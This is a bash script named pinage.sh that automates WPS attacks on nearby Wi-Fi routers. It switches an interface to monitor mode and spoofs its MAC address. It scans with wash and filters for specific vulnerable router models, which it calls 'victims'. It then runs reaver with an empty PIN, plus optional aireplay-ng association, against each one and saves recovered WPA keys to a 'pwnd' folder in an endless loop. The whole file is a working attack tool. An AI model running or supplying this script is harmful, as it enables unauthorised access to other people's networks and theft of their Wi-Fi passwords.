#!/bin/bash

# Variables
OPT_I=0
MAX_LOOP=0
RETRIES=3
A_DURATION=20
W_DURATION=30
SLEEP_TIME=10
PWNDPATH="./pwnd"
ASSO=false
PWND_COUNT=0

# While loop for options
while getopts "i: :h :l: :r: :a: :w: :s: :o: :A" option
do
	case $option in

		i)
			echo "Interface choosed $OPTARG"
			IFACE=$(grep "$OPTARG" /proc/net/dev)
			if [[ -z "$IFACE" ]]; then
				echo "Unknown interface, exiting..."
				exit 1
			else
				IFACE="$OPTARG"
				OPT_I=1
			fi
			;;
		h)
			echo "
pinage.sh [OPTIONS] -i <IFACE>

Required Arguments :

	-i = <iface>, Interface to capture packets on

Optional Arguments :

	-l=<max loops>, Max loops for this script (Default 0, Infinite loop, you must kill PID to stop it)
	-r=<max retries>, Max number of retries on ONE AP (Default 3)
	-a=<time seconds>, Max duration of an Attack (Default 20s)
	-w=<time seconds>, Duration of wash scan (Default 30s)
	-s=<time seconds>, Sleeping time if no AP reachable (Default 10s)
	-A, Associates with AP with the aireplay-ng command instead of reaver (obviously called with -N option) can resolve some issues with associations.
	-o=</path/to/folder>, Save successful logs to this directory (Default : ./pwnd) will be created if not existing
	-h, Displays this help

Examples :

	./pinage.sh -i wlan0
	./pinage.sh -i wlan0 -r 4 -l 5 -a 25 -s 15 -w 35
	./pinage.sh -i wlan0mon -r 3 -a 35 -o /path/to/folder
			"
			exit 1
			;;
		l) 
			if [[ $OPTARG =~ ^-?[0-9]+$ ]] ; then
				echo "Loop count fixed to $OPTARG"
				MAX_LOOP=$OPTARG
			else
				echo "-l option >> argument MUST be a number, exiting... -h for help"
				exit 1
			fi
			;;
		r)
			if [[ $OPTARG =~ ^-?[0-9]+$ ]] && [[ -n $OPTARG ]]; then
				echo "Retries attempts fixed to $OPTARG"
				RETRIES=$OPTARG
			else
				echo "-r option >> argument MUST be a number, exiting... -h for help"
				exit 1
			fi
			;;
		a)
			if [[ $OPTARG =~ ^-?[0-9]+$ ]] ; then
				echo "Attack duration set to $OPTARG"
				A_DURATION=$OPTARG
			else
				echo "-a option >> argument MUST be a number, exiting... -h for help"
				exit 1
			fi
			;;
		w)
			if [[ $OPTARG =~ ^-?[0-9]+$ ]] ; then
				echo "Wash duration set to $OPTARG"
				W_DURATION=$OPTARG
			else
				echo "-w option >> argument MUST be a number, exiting... -h for help"
				exit 1
			fi
			;;
		s)
			if [[ $OPTARG =~ ^-?[0-9]+$ ]] ; then
				echo "Sleep duration set to $OPTARG"
				SLEEP_TIME=$OPTARG
			else
				echo "-s option >> argument MUST be a number, exiting... -h for help"
				exit 1
			fi
			;;
		o)
			if [ -d "$OPTARG" ]; then
				PWNDPATH=$OPTARG
			else
				echo "Path doesn't exists, gonna create it"
				PWNDPATH=$OPTARG
				mkdir -p $PWNDPATH
			fi
			;;
		A)
			ASSO=true
			;;
    esac
done
if [ $OPT_I -ne 1 ]; then echo "Option -i <Interface> MUST BE SET (-h option for help)"; exit 1; fi

# Loop counter
LOOP=1

# Temp folders
mkdir -p /tmp/pinage
mkdir -p ./pwnd
# Cleaning old tmp
rm -f /tmp/pinage/*
# Monitor Mode
airmon-ng check $IFACE
airmon-ng check kill
airmon-ng check $IFACE
ifconfig $IFACE down
iwconfig $IFACE mode monitor
macchanger -A $IFACE
# Could be dangerous for your hardware, use with caution !
# iw set reg BZ
# iwconfig $IFACE txpower 30                                                     
ifconfig $IFACE up                                                               
iwconfig $IFACE | grep Mode
MY_MAC=$(macchanger -s $IFACE | grep 'Current' | awk -F " " '{print $3}')
# list of AP already done in this session
touch /tmp/pinage/pwned.list

# Beginning 
while [[ $LOOP -le $MAX_LOOP ]] || [[ $MAX_LOOP -eq 0 ]]; do
	TIME=$(date -u '+%d %b %Y %H:%M:%S')
	echo "$TIME Wash" > /tmp/pinage/$LOOP-wash.log
	# Wash scan
	timeout $W_DURATION wash -i $IFACE -j >> /tmp/pinage/$LOOP-wash.log
	PWNABLE=$( cat /tmp/pinage/$LOOP-wash.log | grep -E 'NB4-SER-r2|NB4-FXC-r1|NB4-FXC-r2|NB6V-FXC-r0|NB6V-FX-r1|NB6V-FX-r2|NB6V2-FXC-r0|NB6V-SER-r0|SagemcomFast3965|CBV38Z4EN|ZXHN H108N|ZXHN H298N' | uniq )

	# If scan shows vulnerable AP
	if [[ -n $PWNABLE ]]; then
		echo "$PWNABLE" > /tmp/pinage/$LOOP-victims.log
	fi
	# Victim's list
	VICTIMS=$(cat /tmp/pinage/$LOOP-victims.log )
	if [[ -n $VICTIMS ]]; then
		# Parsing the victims
		while read LINE; do
			# Retries count
			TURN=1
			ALREADY_PWND=false
			# Infos
			BSSID=$( echo $LINE | awk -F '"' '{ print $4}')
			ESSID=$( echo $LINE | awk -F '"' '{ print $8}')
			CHANNEL=$(echo 0$( echo $LINE | awk -F '"' '{ print $11}' | awk '{ print $2}' | tr -d ',' )| rev | cut -c 1-2 | rev)
			# Is it already found ?
			while read PWNLIST ; do
				V_MAC=$(echo $PWNLIST)
				if [[ "$V_MAC" = "$BSSID" ]]; then
					ALREADY_PWND=true
				fi
			done < /tmp/pinage/pwned.list
			# If not 
			if [[ "$ALREADY_PWND" = false ]]; then
				while [[ $TURN -le $RETRIES ]]; do
					# if -A option
					if [[ "$ASSO" = true ]]; then
						gnome-terminal -e "timeout $A_DURATION aireplay-ng $IFACE -1 120 -o 1 -q 10 -a $BSSID -e $ESSID -h $MY_MAC" &
						timeout $A_DURATION reaver -i $IFACE -c $CHANNEL -b $BSSID -p "" -A -vvv >> /tmp/pinage/loop$LOOP-$BSSID-turn$TURN-reaver.log
					else
						timeout $A_DURATION reaver -i $IFACE -c $CHANNEL -b $BSSID -p "" -vvv >> /tmp/pinage/loop$LOOP-$BSSID-turn$TURN-reaver.log
					fi
					# Is there a line with WPA ?
					PWNED=$(cat /tmp/pinage/loop$LOOP-$BSSID-turn$TURN-reaver.log | grep WPA)
					if [[ -n $PWNED ]]; then
						VICTIMS_WPA=$(cat /tmp/pinage/loop$LOOP-$BSSID-turn$TURN-reaver.log | grep WPA | awk -F "'" '{print $2}')
						# Is there a WPA key ?
						if [[ -n $VICTIMS_WPA ]]; then
	                		echo "Scanned on $TIME" >> /tmp/pinage/POWNED-"$BSSID".log
	                        echo "BSSID : $BSSID" >> /tmp/pinage/POWNED-"$BSSID".log
			                echo "ESSID : $ESSID" >> /tmp/pinage/POWNED-"$BSSID".log
	                        echo "WPA : \"$VICTIMS_WPA\"" >> /tmp/pinage/POWNED-"$BSSID".log
	                        # Copy the key in folder
			                cp -f /tmp/pinage/POWNED-"$BSSID".log "$PWNDPATH"
			                # Ends the loop
			                TURN=6
			                PWND_COUNT=$(($PWND_COUNT+1))
			                echo "Keys retrieved for now : $PWND_COUNT"
			                # Adding BSSID to pwned.list to avoid multiple attempts when WPA is already found
			                echo "$BSSID" >> /tmp/pinage/pwned.list
			            else
			            	# Increment
	    					TURN=$(($TURN+1))
						fi
					else 
						# Increment
						TURN=$(($TURN+1))
					fi
				done
			else
				echo "You already got WPA for this AP, skipping"
			fi
		done < /tmp/pinage/$LOOP-victims.log
	else
		if [[ $LOOP -lt $MAX_LOOP ]] || [[ $MAX_LOOP -eq 0 ]]; then
			# No ap in wash scan
			echo "TRY #$LOOP / NO AP available, sleeping $SLEEP_TIME seconds before retrying..."
			sleep $SLEEP_TIME
		else
			# When a max loop is set
			echo "Max loop reached, exiting"
			echo "Total keys retrieved : $PWND_COUNT"
		fi
	fi
	LOOP=$(($LOOP+1))
done

# Livebox 2 & 3 Sagem, SFR Neufbox 4 (NB4-FXC-r1),6 (NB6V-FXC-r0) & 6V (NB6V-FXC-r1), Numericable Netgear
# TODO : Implement -F option "filter" by SSID (faster but less accurate)
# TODO : Implement -S option "safe", reaver with -x 360 -t 0.5 options